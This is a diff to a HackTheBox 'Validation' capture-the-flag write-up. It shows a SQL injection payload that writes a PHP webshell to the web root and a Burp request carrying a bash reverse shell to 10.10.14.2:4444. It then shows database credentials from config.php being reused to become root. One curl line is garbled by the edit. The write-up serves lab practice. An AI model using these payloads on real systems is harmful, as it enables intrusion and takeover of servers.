@@ -73,11 +73,40 @@ Unfortunately, there's no password here!
 We can try to write a file by setting the following values: `username=csbbbbb&country=' union select "Hello I'm here" into outfile '/var/www/html/test.txt' -- -`.
 Now, visiting 10.10.11.116/test.txt we should see the string!
 
-At this point, we can try to write a simple php webshell: `username=asdadadadadad&country=' union select "<?php SYSTEM($_GET['cmd']); ?>" into outfile '/var/www/html/shell.php' -- -`.
+At this point, we can try to write a simple php webshell: `username=asdadadadadad&country=' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE
+'/var/www/html/shell.php'-- -`.
+
 And it works!
 ```
-kali@kali:~/HackTheBox/retired/Linux/easy/Validation$ curl http://10.10.11.116/shell.php?cmd=id
+kali@kali:~/HackTheBox/retired/Linux/easy/Validation$ curl http://10.10.11.116/shell.php?cmd= "
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
+To get a reverse shell just make a POST request with Burp, in the Repeater modifying the GET request that you can intercept when you visit http://10.10.11.116/shell.php, and add at the bottom the **cmd** parameter with the reverse shell URL encoded:
+```
+POST /shell.php HTTP/1.1
+Host: 10.10.11.116
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: user=ff362afb00fa83da92fd95b38424a556
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 58
+
+cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.2/4444+0>%261'
+```
+
+### From www-data to Root
+We cant `cat config.php` to reveal the DB credentials and notice that the password has "global-pw" in it. This may be an hint which means that the password may be used also somewhere else.
+```
+  $servername = "127.0.0.1";
+  $username = "uhc";
+  $password = "uhc-9qual-global-pw";
+  $dbname = "registration";
+```
+
+Let's try `su -` with the password that we have seen to get a shell as root!
 
